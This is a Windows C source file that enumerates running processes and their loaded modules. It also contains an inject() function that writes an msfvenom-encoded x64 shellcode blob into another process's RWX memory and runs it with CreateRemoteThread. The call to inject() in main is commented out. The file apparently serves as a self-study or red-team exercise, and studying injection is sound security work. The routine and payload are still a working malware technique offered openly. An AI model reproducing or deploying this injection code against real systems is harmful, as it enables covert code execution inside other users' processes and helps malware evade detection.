#include "stdio.h"	// printf() depends on this
#include "tchar.h"	// _tprintf() depends on this (also: wide characters)
#include "windows.h"
#include "owl.h"

#include "tlhelp32.h"

void inject(int PID);
boolean enumProcs();
boolean listProcessModules(DWORD dwPID);


int main(int argc, char* argv[]) {
	// printf("Hello world %s\r\n", "!");
	enumProcs();
	// inject(23816);
	return 0;
}


// https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
boolean enumProcs() {
	// #include "tlhelp32.h"
	/*
		https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
		HANDLE CreateToolhelp32Snapshot(
			[in] DWORD dwFlags,	// TH32CS_SNAPPROCESS -> 0x00000002 (Includes all processes in the system in the snapshot.To enumerate the processes, see Process32First.)
			[in] DWORD th32ProcessID	// The process identifier of the process to be included in the snapshot. This parameter can be zero to indicate the current process. This parameter is used when the TH32CS_SNAPHEAPLIST, TH32CS_SNAPMODULE, TH32CS_SNAPMODULE32, or TH32CS_SNAPALL value is specified. Otherwise, it is ignored and all processes are included in the snapshot.
		);
		
		Return value:
		* If the function succeeds, it returns an open handle to the specified snapshot.
		* If the function fails, it returns INVALID_HANDLE_VALUE. To get extended error information, call GetLastError. Possible error codes include ERROR_BAD_LENGTH.
	*/
	HANDLE hProcessSnap;
	HANDLE hProcess;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printf("Failed while enumerating running processes (%d)\r\n", GetLastError());
		return FALSE;
	}

	// Set the size of the struct before using it.
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve info about the first process
	// exit if unsuccessful
	/*
		https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
		BOOL Process32First(
		  [in]      HANDLE           hSnapshot,	// A handle to the snapshot returned from a previous call to the CreateToolhelp32Snapshot function.
		  [in, out] LPPROCESSENTRY32 lppe	// A pointer to a PROCESSENTRY32 structure. It contains process information such as the name of the executable file, the process identifier, and the process identifier of the parent process.
		);
		Return Value:
		* Returns TRUE if the first entry of the process list has been copied to the buffer or FALSE otherwise.
		* The ERROR_NO_MORE_FILES error value is returned by the GetLastError function if no processes exist or the snapshot does not contain process information.
	*/
	if (!Process32First(hProcessSnap, &pe32)) {
		printf("First process retrieved by Process32First is invalid (%d)", GetLastError());
		CloseHandle(hProcessSnap);
		return FALSE;
	}
	
	// Walk running processes.
	// _tprintf("[+] Enumerating Processes:\r\n");
	printf("[+] Enumerating Processes:\r\n");

	do {
		/*
		typedef struct tagPROCESSENTRY32W
		{
			DWORD   dwSize;
			DWORD   cntUsage;
			DWORD   th32ProcessID;          // this process
			ULONG_PTR th32DefaultHeapID;
			DWORD   th32ModuleID;           // associated exe
			DWORD   cntThreads;
			DWORD   th32ParentProcessID;    // this process's parent process
			LONG    pcPriClassBase;         // Base priority of process's threads
			DWORD   dwFlags;
			WCHAR   szExeFile[MAX_PATH];    // Path
		} PROCESSENTRY32W;
		*/
		//_tprintf("[*] Process PID: %d\r\n", pe32.th32ModuleID);
		//_tprintf("\tProcess ParentPID: %d\r\n", pe32.th32ParentProcessID);
		//_tprintf("\tProcess' associated exe: %s\r\n", pe32.szExeFile);
		//_tprintf("\tProcess' thread count: %d\r\n", pe32.cntThreads);
		//_tprintf("\tProcess' dwFlags: %d\r\n", pe32.dwFlags);




		printf("[+] ======================\r\n");
		printf("[*] Process PID: %d\r\n", pe32.th32ProcessID);
		printf("\tProcess' associated exe: %ws\r\n", pe32.szExeFile);
		DWORD dwPriorityClass = 0;

		/*
			// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
			// * Process Access Rights: https://learn.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights
			// * SeDebugPrivilege Privilege: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants#SE_DEBUG_NAME

			HANDLE OpenProcess(
			  [in] DWORD dwDesiredAccess,
			  [in] BOOL  bInheritHandle,
			  [in] DWORD dwProcessId
			);	

			Return value:
			* If the function succeeds, the return value is an open handle to the specified process.
			* If the function fails, the return value is NULL. To get extended error information, call GetLastError.
		*/
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
		// hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

		if (hProcess == NULL) {
			printf("\tError while attempting to OpenProcess -> %d", pe32.th32ProcessID);
		} else {
			dwPriorityClass = GetPriorityClass(hProcess);
			if (!dwPriorityClass) {
				printf("\tError in GetPriorityClass()");
				// hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
				CloseHandle(hProcess);
			}
		}


		printf("\tProcess ParentPID: %d\r\n", pe32.th32ParentProcessID);
		printf("\tProcess' thread count: %d\r\n", pe32.cntThreads);
		// printf("\tProcesses' base thread prio: %d\r\n", pe32.pcPriClassBase);
		printf("\tProcess' dwFlags: %d\r\n", pe32.dwFlags);


		// To read module info we need to OpenProcess

		listProcessModules(pe32.th32ProcessID);

		printf("[+] -----------------------\r\n");



	} while(Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);


	gets();
	return TRUE;
}

boolean listProcessModules(DWORD dwPID) {
	HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
	/*
		// https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32
		typedef struct tagMODULEENTRY32 {
		  DWORD   dwSize;	// The size of the structure, in bytes. Before calling the Module32First function, set this member to sizeof(MODULEENTRY32). If you do not initialize dwSize, Module32First fails.
		  DWORD   th32ModuleID;	// This member is no longer used, and is always set to one.
		  DWORD   th32ProcessID;	// The identifier of the process whose modules are to be examined.
		  DWORD   GlblcntUsage;	// The load count of the module, which is not generally meaningful, and usually equal to 0xFFFF.
		  DWORD   ProccntUsage;	// The load count of the module (same as GlblcntUsage), which is not generally meaningful, and usually equal to 0xFFFF.
		  BYTE    *modBaseAddr;	// The base address of the module in the context of the owning process.
		  DWORD   modBaseSize;	// The size of the module, in bytes.
		  HMODULE hModule;	// A handle to the module in the context of the owning process.
		  char    szModule[MAX_MODULE_NAME32 + 1];	// The module name.
		  char    szExePath[MAX_PATH];	// The module path.
		} MODULEENTRY32;
	*/
	MODULEENTRY32 me32;

	// Take a snapshot of all modules in the specified process.
	hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);
	if (hModuleSnap == INVALID_HANDLE_VALUE) {
		printf("\tAn error occurred while enumerating modules of Process w PID: (%d)\r\n", dwPID);
		printf("\tError: (%d)\r\n", GetLastError());
		// CloseHandle(hModuleSnap);
		return FALSE;
	}

	// Set the size of the structure before using it.
	me32.dwSize = sizeof(MODULEENTRY32);

	// Retrieve info about the first module and exit if unsuccessful.
	if (!Module32First(hModuleSnap, &me32)) {
		printf("\tError Occurred while trying to read modules of PID: (%d)\r\n", dwPID);
		CloseHandle(hModuleSnap);
		return FALSE;
	}


	// Walk the module list
	do {

		/*
			typedef struct tagMODULEENTRY32W
			{
				DWORD   dwSize;
				DWORD   th32ModuleID;       // This module
				DWORD   th32ProcessID;      // owning process
				DWORD   GlblcntUsage;       // Global usage count on the module
				DWORD   ProccntUsage;       // Module usage count in th32ProcessID's context
				BYTE* modBaseAddr;        // Base address of module in th32ProcessID's context
				DWORD   modBaseSize;        // Size in bytes of module starting at modBaseAddr
				HMODULE hModule;            // The hModule of this module in th32ProcessID's context
				WCHAR   szModule[MAX_MODULE_NAME32 + 1];
				WCHAR   szExePath[MAX_PATH];
			} MODULEENTRY32W;
			typedef MODULEENTRY32W* PMODULEENTRY32W;
			typedef MODULEENTRY32W* LPMODULEENTRY32W;
		*/

		printf("\t----------\r\n");
		printf("\tModule Name: %ws\r\n", me32.szModule);
		printf("\tModule Exe/PE Path: %ws\r\n", me32.szExePath);
		// printf("\tModule module ID: %d\r\n", me32.th32ModuleID);	// No longer used, and is always set to 1
		printf("\tModule base addr: 0x%08x\r\n", me32.modBaseAddr);	// The base address of the module in the context of the owning process.
		printf("\tModule base size (hex): 0x%x\r\n", me32.modBaseSize);	// The size of the module, in bytes.
		printf("\tModule base size (dec): %d\r\n", me32.modBaseSize);
		// printf("\tModule being used (0x%04x) times by Process\r\n", me32.ProccntUsage);	// usually 0xFFFF
		// printf("\tModule being used (0x%04x) times system wide\r\n", me32.GlblcntUsage);	// usually 0xFFFF
		printf("\t----------\r\n");

	} while(Module32Next(hModuleSnap, &me32));

	CloseHandle(hModuleSnap);
	return TRUE;
}

/*
	Remote Process injection
	PID -> inject shellcode into process with PID & run CreateRemoteThread
	@TODO: Add checks to make requesting memory page perms more granular. -> W instead of RWX & then X
*/
void inject(int PID) {
	printf("[+] Inj to PID: %d\r\n", PID);

	printf("[+] Obtain handle\r\n");

	HANDLE processHandle;
	// OpenProcess()
	// https ://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	/*
		HANDLE OpenProcess(
			[in] DWORD dwDesiredAccess, // PROCESS_ALL_ACCESS
			[in] BOOL  bInheritHandle,
			[in] DWORD dwProcessId
		);
	*/
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	// VirtualAllocEx()
	/*
	LPVOID VirtualAllocEx(
		[in]           HANDLE hProcess,	// obtained by OpenProcess
		[in, optional] LPVOID lpAddress,	// If lpAddress is NULL, the function determines where to allocate the region.
		[in]           SIZE_T dwSize,	// sizeof (shellcode)
		[in]           DWORD  flAllocationType, // (MEM_RESERVE | MEM_COMMIT)
		[in]           DWORD  flProtect	// PAGE_EXECUTE_READWRITE OR 0x40
	);
	*/
	// Run notepad.exe -> encoded with x64 msfvenom encoder; --platform windows --arch x64
	unsigned char shellcode[] = "\x54\x41\x5e\x48\x31\xd2\x49\xbd\x91\x5f\xe2\x61\xe6\x27"
								"\x6d\xf1\xd9\xcc\xb2\x23\x66\x41\x81\xe6\xf0\xf7\x49\x0f"
								"\xae\x06\x49\x83\xc6\x08\x4d\x8b\x26\x48\xff\xca\x4d\x31"
								"\x6c\xd4\x22\x48\x85\xd2\x75\xf3\x6d\x17\x61\x85\x16\xcf"
								"\xad\xf1\x91\x5f\xa3\x30\xa7\x77\x3f\xa0\xc7\x17\xd3\xb3"
								"\x83\x6f\xe6\xa3\xf1\x17\x69\x33\xfe\x6f\xe6\xa3\xb1\x17"
								"\x69\x13\xb6\x6f\x62\x46\xdb\x15\xaf\x50\x2f\x6f\x5c\x31"
								"\x3d\x63\x83\x1d\xe4\x0b\x4d\xb0\x50\x96\xef\x20\xe7\xe6"
								"\x8f\x1c\xc3\x1e\xb3\x29\x6d\x75\x4d\x7a\xd3\x63\xaa\x60"
								"\x36\xac\xed\x79\x91\x5f\xe2\x29\x63\xe7\x19\x96\xd9\x5e"
								"\x32\x31\x6d\x6f\x75\xb5\x1a\x1f\xc2\x28\xe7\xf7\x8e\xa7"
								"\xd9\xa0\x2b\x20\x6d\x13\xe5\xb9\x90\x89\xaf\x50\x2f\x6f"
								"\x5c\x31\x3d\x1e\x23\xa8\xeb\x66\x6c\x30\xa9\xbf\x97\x90"
								"\xaa\x24\x21\xd5\x99\x1a\xdb\xb0\x93\xff\x35\xb5\x1a\x1f"
								"\xc6\x28\xe7\xf7\x0b\xb0\x1a\x53\xaa\x25\x6d\x67\x71\xb8"
								"\x90\x8f\xa3\xea\xe2\xaf\x25\xf0\x41\x1e\xba\x20\xbe\x79"
								"\x34\xab\xd0\x07\xa3\x38\xa7\x7d\x25\x72\x7d\x7f\xa3\x33"
								"\x19\xc7\x35\xb0\xc8\x05\xaa\xea\xf4\xce\x3a\x0e\x6e\xa0"
								"\xbf\x29\x5c\x26\x6d\xf1\x91\x5f\xe2\x61\xe6\x6f\xe0\x7c"
								"\x90\x5e\xe2\x61\xa7\x9d\x5c\x7a\xfe\xd8\x1d\xb4\x5d\xd7"
								"\xd8\x53\xc7\x1e\x58\xc7\x73\x9a\xf0\x0e\x44\x17\x61\xa5"
								"\xce\x1b\x6b\x8d\x9b\xdf\x19\x81\x93\x22\xd6\xb6\x82\x2d"
								"\x8d\x0b\xe6\x7e\x2c\x78\x4b\xa0\x37\x0f\x89\x53\x08\x81"
								"\xf0\x3b\xcc\x04\x9e\x42\x6d\x6e";

	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	/*
	BOOL WriteProcessMemory(
		[in]  HANDLE  hProcess,
		[in]  LPVOID  lpBaseAddress,
		[in]  LPCVOID lpBuffer,
		[in]  SIZE_T  nSize,
		[out] SIZE_T * lpNumberOfBytesWritten
	);
	// If the function fails, the return value is 0 (zero).
	*/
	unsigned long long numBytesWritten = 0;
	// or size_t numBytesWritten
	if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), &numBytesWritten)) {
		printf("An error occurred while writing to remoteBuffer - (%d)\r\n", GetLastError());
		return;
	}

	
	/*
	HANDLE CreateRemoteThread(
		[in]  HANDLE                 hProcess,
		[in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
		[in]  SIZE_T                 dwStackSize,
		[in]  LPTHREAD_START_ROUTINE lpStartAddress,
		[in]  LPVOID                 lpParameter,
		[in]  DWORD                  dwCreationFlags,
		[out] LPDWORD                lpThreadId
	);
	*/
	if (!CreateRemoteThread(processHandle, NULL, 0, remoteBuffer, NULL, 0, NULL)) {
		printf("An error occurred while creating the remote thread - (%d)\r\n", GetLastError());
	}
	CloseHandle(processHandle);

	return;
}